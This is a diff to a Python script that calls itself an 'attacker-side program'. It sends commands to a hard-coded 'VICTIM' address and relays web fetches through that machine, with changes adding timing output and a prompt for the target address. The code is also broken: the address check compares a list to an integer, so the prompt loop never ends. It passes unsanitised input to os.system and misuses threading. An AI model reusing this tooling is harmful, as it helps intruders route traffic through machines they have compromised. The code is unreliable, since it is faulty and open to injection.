@@ -7,7 +7,7 @@ import threading;
 from sys import argv;
 
 ''' GLOBAL VARS '''
-VICTIM = ("127.0.0.1",1337); # (<ip_address>, <port_no.>)
+VICTIM = ["127.0.0.1",1337]; # (<ip_address>, <port_no.>)
 
 ''' FUNCTIONS '''
 def menu():
@@ -29,8 +29,10 @@ def send(action,value):
 def tunnel():
 	url = input("[address] -> ");
 	print("Fetching....");
+	start_time = time.time();
 	bin_resp = send("tunnel",url);
-	print("Got response! Saving to "+url+".html");
+	fetch_time = time.time() - start_time;
+	print("Got response [in "+str(fetch_time)+" seconds]! Saving to "+url+".html");
 	op_file = open(url+".html","wb");
 	op_file.write(bin_resp);
 	op_file.close();
@@ -39,15 +41,22 @@ def tunnel():
 		threading.Thread(target=os.system("xdg-open "+url+".html 1> /dev/null"));
 	return;
 
+def get_target():
+	while True:
+		ip = input("Victim Address -> ");
+		if ip.split(".") == 4:
+			return(ip);
+
 ''' MAIN '''
 if __name__ == "__main__":
 	print("Starting attacker-side program....");
 	run_flag = True;
 	
-	if len(argv) > 2:
-		if argv[1].split(".") == 4:
-			VICTIM[0]=argv[1];
-	
+	if len(argv) >= 2:
+		VICTIM[0]=argv[1];
+	else:
+		VICTIM[0] = get_target();
+		
 	while run_flag == True:
 		choice = menu();
 		if choice == "tunnel":
